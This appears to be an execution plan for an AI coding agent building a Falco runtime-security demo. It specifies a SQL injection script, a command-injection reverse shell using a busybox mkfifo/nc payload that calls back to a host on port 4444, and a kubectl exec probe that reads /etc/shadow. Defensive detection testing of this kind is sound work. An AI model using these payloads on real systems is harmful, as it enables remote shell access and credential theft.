---
phase: 05-runtime-security
plan: 02
type: execute
wave: 1
depends_on: []
files_modified:
  - attacks/sqli.py
  - attacks/reverse_shell.sh
  - attacks/privilege_probe.sh
autonomous: true
requirements: [ATK-01, ATK-02, ATK-03, ATK-04]

must_haves:
  truths:
    - "attacks/sqli.py extracts data or surfaces a SQL error against localhost:30080/sqli, deterministically and idempotently"
    - "attacks/reverse_shell.sh triggers /cmd command injection with a busybox-safe payload that spawns nc + sh child of node"
    - "attacks/privilege_probe.sh reads /etc/shadow and runs apk inside the demoapp pod via non-interactive kubectl exec"
    - "Every attack script refuses to run against a non-local target (ethical guard) and documents the constraint"
  artifacts:
    - path: "attacks/sqli.py"
      provides: "Deterministic SQL injection PoC (ATK-01) — doubles as the ATK-01 test"
      contains: "localhost"
    - path: "attacks/reverse_shell.sh"
      provides: "Command-injection reverse-shell trigger (ATK-02)"
      contains: "mkfifo"
    - path: "attacks/privilege_probe.sh"
      provides: "In-container sensitive-file + package-mgmt probe (ATK-03)"
      contains: "/etc/shadow"
  key_links:
    - from: "attacks/reverse_shell.sh"
      to: "http://localhost:30080/cmd"
      via: "URL-encoded busybox mkfifo payload passed to /cmd?input="
      pattern: "/cmd\\?input="
    - from: "attacks/privilege_probe.sh"
      to: "demoapp pod"
      via: "kubectl exec -n demoapp deploy/demoapp (no -it, tty=0)"
      pattern: "kubectl exec -n demoapp"
---

<objective>
Author the three attack simulation scripts that drive the Falco detection demo:
SQL injection, command-injection reverse shell, and in-container privilege probe.
Each hard-codes localhost/cluster targets and carries an ethical safety guard.

Purpose: These scripts are the Scenario-3 attack drivers AND the executable tests for
FALCO rule firing (they double as ATK-0x acceptance tests in Plan 05-03).
Output: attacks/sqli.py, attacks/reverse_shell.sh, attacks/privilege_probe.sh.

NOTE: Authoring on macOS (code only). Runtime execution + alert assertions happen on
the Windows/WSL2 Rancher Desktop target (Plan 05-03). These scripts must not depend on
Falco existing to be authored — the target endpoints are already known.
</objective>

<execution_context>
@$HOME/.claude/get-shit-done/workflows/execute-plan.md
@$HOME/.claude/get-shit-done/templates/summary.md
</execution_context>

<context>
@.planning/PROJECT.md
@.planning/ROADMAP.md
@.planning/phases/05-runtime-security/05-RESEARCH.md
@CLAUDE.md
@app/server.js
@app/verify.sh
@deploy/base/service.yaml

<interfaces>
<!-- Confirmed attack surface (from app/server.js + deploy/base). No exploration needed. -->
- App reachable at `http://localhost:30080` (NodePort 30080 -> containerPort 3000).
- `GET /sqli?user=<v>` -> raw string concat `SELECT * FROM users WHERE id = '<v>'`; SQL error returned as JSON `{error, query}` with HTTP 500 (proof of injection), or `{results}` on success.
- `GET /cmd?input=<v>` -> `child_process.exec(v)` -> `/bin/sh -c "<v>"`; returns `{stdout, stderr, exit_code}`.
- Pod: namespace `demoapp`, Deployment `demoapp`, container `demoapp`, base `node:14.21.3-alpine` (busybox).
- Busybox constraints: NO bash, NO `/dev/tcp`, busybox `nc` has NO `-e`. Use mkfifo payload.
</interfaces>

<research_corrections>
<!-- From 05-RESEARCH.md "Code Examples" + Pitfall 3/7 -->
- Reverse shell payload MUST be busybox-safe (no bash, no `nc -e`):
  `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <HOST> 4444 > /tmp/f`
  URL-encode it and hit `/cmd?input=<encoded>`. It fires "Shell Spawned by Web App" (sh child of node)
  AND "Reverse Shell Tool" (nc execve) on process spawn — robust even if the socket never connects.
- privilege_probe MUST use `kubectl exec` WITHOUT `-it` (tty=0) so it fires as an attack, not a debug session.
  `kubectl exec -n demoapp deploy/demoapp -- sh -c 'cat /etc/shadow; id; whoami; apk add curl'`
- Ethical guard (ATK-04) at top of each script:
  `case "$TARGET" in localhost|127.0.0.1|host.rancher-desktop.internal|10.43.*) ;; *) echo "Refusing non-local target"; exit 1;; esac`
</research_corrections>
</context>

<tasks>

<task type="auto">
  <name>Task 1: Author attacks/sqli.py (ATK-01) with ethical guard (ATK-04)</name>
  <files>attacks/sqli.py</files>
  <read_first>
    - attacks/sqli.py (if it exists — otherwise you are creating it)
    - app/server.js (the /sqli handler — confirms error shape returned on injection)
    - .planning/phases/05-runtime-security/05-RESEARCH.md ("Code Examples" -> ATK-01; "ATK-04 ethical guard")
  </read_first>
  <action>
    Create `attacks/sqli.py` (Python 3, stdlib only — use `urllib.request`/`urllib.parse`, NO external deps
    so it runs in Git Bash/WSL without pip).

    Behavior:
    1. Define `TARGET_HOST = "localhost"` and `PORT = 30080` as hard-coded module constants.
    2. Ethical guard: if `TARGET_HOST` not in `{"localhost","127.0.0.1","host.rancher-desktop.internal"}`
       (or does not start with `10.43.`), print "Refusing non-local target" and `sys.exit(1)`.
       Include a comment: `# ETHICAL CONSTRAINT: localhost/cluster targets only (ATK-04).`
    3. Send `GET http://localhost:30080/sqli?user=<payload>` where payload is the classic
       `' OR '1'='1` (URL-encoded via `urllib.parse.quote`).
    4. Deterministic success criterion (idempotent — repeatable, no state mutation): treat the run
       as SUCCESS if EITHER the response is HTTP 200 with a JSON `results` array, OR HTTP 500 with a
       JSON body containing `error` and `query` (the surfaced SQL error IS proof of injection — see
       server.js). Any other outcome (connection refused, 404) is FAILURE.
    5. Print the request URL, the HTTP status, and a one-line verdict. `sys.exit(0)` on success,
       `sys.exit(1)` on failure. Handle `urllib.error.HTTPError` (500 is expected/success, not a crash).
  </action>
  <verify>
    <automated>python3 -c "import ast; ast.parse(open('attacks/sqli.py').read()); print('sqli.py parses')" && grep -q "localhost" attacks/sqli.py && grep -qi "Refusing non-local" attacks/sqli.py && grep -q "/sqli" attacks/sqli.py</automated>
  </verify>
  <acceptance_criteria>
    - `python3 -c "import ast; ast.parse(open('attacks/sqli.py').read())"` exits 0 (valid Python)
    - `grep -q "30080" attacks/sqli.py` and `grep -q "/sqli" attacks/sqli.py`
    - Ethical guard present: `grep -qi "Refusing non-local" attacks/sqli.py` AND `grep -qi "ATK-04\|ETHICAL" attacks/sqli.py`
    - Uses stdlib only: `! grep -q "import requests" attacks/sqli.py` (urllib, not requests)
    - Handles the 500-is-success case: `grep -q "500\|HTTPError" attacks/sqli.py`
    - Script has both `sys.exit(0)` and `sys.exit(1)` paths
  </acceptance_criteria>
  <done>attacks/sqli.py is valid Python 3 (stdlib only), targets localhost:30080/sqli with `' OR '1'='1`, treats 200-results or 500-SQL-error as success, refuses non-local targets.</done>
</task>

<task type="auto">
  <name>Task 2: Author attacks/reverse_shell.sh (ATK-02) with busybox-safe payload + ethical guard (ATK-04)</name>
  <files>attacks/reverse_shell.sh</files>
  <read_first>
    - attacks/reverse_shell.sh (if it exists — otherwise you are creating it)
    - app/server.js (the /cmd handler — child_process.exec -> /bin/sh -c)
    - attacks/sqli.py (reuse the same TARGET/guard convention for consistency)
    - .planning/phases/05-runtime-security/05-RESEARCH.md ("Code Examples" -> ATK-02; "Pitfall 3")
  </read_first>
  <action>
    Create `attacks/reverse_shell.sh` (bash, executable) that triggers the /cmd command injection to
    launch a busybox-safe reverse shell.

    Behavior:
    1. `set -euo pipefail`. Hard-code `TARGET="localhost"`, `PORT=30080`, `LISTEN_PORT=4444`,
       `LHOST="host.rancher-desktop.internal"` (the reverse-shell callback host — routable from the VM).
    2. Ethical guard (ATK-04) at top:
       `case "$TARGET" in localhost|127.0.0.1|host.rancher-desktop.internal|10.43.*) ;; *) echo "Refusing non-local target"; exit 1;; esac`
       plus comment `# ETHICAL CONSTRAINT: localhost/cluster targets only (ATK-04).`
    3. Build the busybox-safe payload (NO bash, NO nc -e):
       `PAYLOAD='rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc '"$LHOST"' '"$LISTEN_PORT"' > /tmp/f'`
    4. URL-encode the payload (use `python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$PAYLOAD"`
       or `jq -sRr @uri`). Then `curl -sS --max-time 8 "http://localhost:30080/cmd?input=<encoded>"` (the
       app enforces a 5s exec timeout so the request returns).
    5. Echo the payload and the HTTP response. The point is to make the demoapp container SPAWN
       `sh` (child of node) and `nc` — which is what fires the Falco rules, whether or not the socket connects.
    6. Exit 0 if the curl call completed (HTTP request reached /cmd); non-zero on connection failure.
       Add a comment noting a listener is optional: `# Optional listener on host: nc -lvnp 4444`.
  </action>
  <verify>
    <automated>bash -n attacks/reverse_shell.sh && test -x attacks/reverse_shell.sh && grep -q "mkfifo" attacks/reverse_shell.sh && grep -q "/cmd?input=" attacks/reverse_shell.sh && grep -qi "Refusing non-local" attacks/reverse_shell.sh && ! grep -q "nc -e\|/dev/tcp\|bash -i" attacks/reverse_shell.sh && echo "reverse_shell.sh OK"</automated>
  </verify>
  <acceptance_criteria>
    - `bash -n attacks/reverse_shell.sh` exits 0 AND `test -x attacks/reverse_shell.sh`
    - Busybox-safe payload: `grep -q "mkfifo /tmp/f" attacks/reverse_shell.sh` AND `! grep -Eq "nc -e|/dev/tcp|bash -i" attacks/reverse_shell.sh`
    - Hits the injection endpoint: `grep -q "/cmd?input=" attacks/reverse_shell.sh`
    - Ethical guard present: `grep -qi "Refusing non-local" attacks/reverse_shell.sh` AND `grep -qi "ATK-04\|ETHICAL" attacks/reverse_shell.sh`
    - `grep -q "4444" attacks/reverse_shell.sh` (listener port)
    - URL-encodes the payload before sending: `grep -Eq "quote|@uri|--data-urlencode" attacks/reverse_shell.sh`
  </acceptance_criteria>
  <done>attacks/reverse_shell.sh valid+executable, sends a URL-encoded busybox mkfifo payload to /cmd, no bash/`nc -e`/`/dev/tcp`, refuses non-local targets.</done>
</task>

<task type="auto">
  <name>Task 3: Author attacks/privilege_probe.sh (ATK-03) with non-interactive exec + ethical guard (ATK-04)</name>
  <files>attacks/privilege_probe.sh</files>
  <read_first>
    - attacks/privilege_probe.sh (if it exists — otherwise you are creating it)
    - attacks/reverse_shell.sh (reuse the TARGET/guard convention)
    - deploy/base/deployment.yaml (confirms Deployment name `demoapp`, namespace `demoapp`)
    - .planning/phases/05-runtime-security/05-RESEARCH.md ("Code Examples" -> ATK-03; "Pitfall 7")
  </read_first>
  <action>
    Create `attacks/privilege_probe.sh` (bash, executable) that execs into the demoapp pod and runs the
    sensitive-file + package-management probes.

    Behavior:
    1. `set -euo pipefail`. Hard-code `NS="demoapp"`, `DEPLOY="deploy/demoapp"`, `TARGET="cluster"`.
    2. Ethical guard (ATK-04): only proceed if the current kube-context is a local cluster. Assert the
       kubernetes API is the local k3s: `kubectl config current-context` and refuse if it does not look
       local. Practical guard: `case "$TARGET" in cluster|localhost|10.43.*) ;; *) echo "Refusing non-local target"; exit 1;; esac`
       plus comment `# ETHICAL CONSTRAINT: local k3s cluster only (ATK-04).`
    3. Run a SINGLE non-interactive exec (NO `-it`, so tty=0 — fires as attack per Pitfall 7):
       `kubectl exec -n "$NS" "$DEPLOY" -- sh -c 'cat /etc/shadow; echo ---; id; whoami; apk add --no-cache curl'`
    4. Echo each step. The exec must run `cat /etc/shadow` (fires "Read Sensitive File in demoapp") and
       `apk add` (fires "Package Management in demoapp").
    5. Exit 0 if the exec ran (the probes are best-effort — `apk add` may fail on a read-only or
       network-less container, but the execve still fires the rule). Only fail (exit 1) if the pod is
       unreachable / exec could not start.
  </action>
  <verify>
    <automated>bash -n attacks/privilege_probe.sh && test -x attacks/privilege_probe.sh && grep -q "/etc/shadow" attacks/privilege_probe.sh && grep -q "apk add" attacks/privilege_probe.sh && grep -q "kubectl exec -n demoapp" attacks/privilege_probe.sh && ! grep -q "exec -it\|exec -n demoapp -it" attacks/privilege_probe.sh && grep -qi "Refusing non-local" attacks/privilege_probe.sh && echo "privilege_probe.sh OK"</automated>
  </verify>
  <acceptance_criteria>
    - `bash -n attacks/privilege_probe.sh` exits 0 AND `test -x attacks/privilege_probe.sh`
    - Non-interactive exec (tty=0): `grep -q "kubectl exec -n demoapp" attacks/privilege_probe.sh` AND `! grep -Eq "exec .*-it|exec .*-ti" attacks/privilege_probe.sh`
    - Sensitive-file probe: `grep -q "cat /etc/shadow" attacks/privilege_probe.sh`
    - Package-mgmt probe: `grep -q "apk add" attacks/privilege_probe.sh`
    - Ethical guard present: `grep -qi "Refusing non-local" attacks/privilege_probe.sh` AND `grep -qi "ATK-04\|ETHICAL" attacks/privilege_probe.sh`
  </acceptance_criteria>
  <done>attacks/privilege_probe.sh valid+executable, runs a single non-interactive kubectl exec doing `cat /etc/shadow` + `apk add`, refuses non-local targets.</done>
</task>

</tasks>

<verification>
On macOS (authoring), all `<automated>` checks pass:
- `python3 -c "import ast; ast.parse(...)"` clean for sqli.py
- `bash -n` clean + executable bit set for both .sh scripts
- grep confirms busybox-safe payload, non-interactive exec, ethical guards

Runtime firing (deferred to Plan 05-03 on target): each script drives its Falco rule(s)
within 30s and is asserted by falco/verify-phase5.sh.
</verification>

<success_criteria>
- attacks/sqli.py: stdlib-only, localhost:30080/sqli, deterministic success (200-results OR 500-SQL-error), ethical guard
- attacks/reverse_shell.sh: busybox mkfifo payload URL-encoded to /cmd, no bash/`nc -e`/`/dev/tcp`, ethical guard
- attacks/privilege_probe.sh: non-interactive `kubectl exec` doing cat /etc/shadow + apk add, ethical guard
- All three refuse non-local targets and document the ATK-04 constraint
</success_criteria>

<output>
After completion, create `.planning/phases/05-runtime-security/05-attack-scripts-SUMMARY.md`
</output>
